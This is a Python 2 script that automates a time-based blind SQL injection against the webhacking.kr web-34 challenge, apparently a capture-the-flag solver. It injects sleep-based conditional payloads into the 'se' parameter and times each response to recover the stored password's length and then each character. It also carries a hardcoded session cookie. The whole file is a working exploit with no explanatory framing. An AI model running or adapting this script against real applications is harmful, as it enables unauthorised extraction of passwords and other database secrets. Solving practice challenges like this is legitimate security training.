import urllib
import urllib2
import time

string = " abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
length = 0
key = ""

for i in range(100):
    payload = "if(length(pw)=%d,sleep(2),0)"%(i)

    url = "http://webhacking.kr/challenge/web/web-34/index.php?msg=1&se="+urllib.quote_plus(payload)
    request = urllib2.Request(url, headers= {"Cookie" : "PHPSESSID=9bc9c18853fe41aa49076e75a2d0d866" })
    time.sleep(0.2)
    t = time.time() # start time check
    response = urllib2.urlopen(request)
    excute_time = time.time() - t # execute time

    print "[+] Request - "+payload,

    if excute_time > 2:
        print "=> True"
        length = i
        break;
    else:
        print "=> False" 
    
for i in range(length):
    for j in range(len(string)):
        payload = "if(mid(pw,"+str(i+1)+",1)="+hex(ord(string[j]))+",sleep(2),0)"

        url = "http://webhacking.kr/challenge/web/web-34/index.php?msg=1&se="+urllib.quote_plus(payload)
        request = urllib2.Request(url, headers= {"Cookie" : "PHPSESSID=9bc9c18853fe41aa49076e75a2d0d866" })
        time.sleep(0.2)
        t = time.time() # start time check
        response = urllib2.urlopen(request)
        excute_time = time.time() - t # execute time

        print "[+] Request - "+payload,
        if excute_time > 2:
            print "=>  True"
            key += string[j]
            print "[*] Find key!!! key is ["+key+"]"
            break;
        else:
            print "=> False"
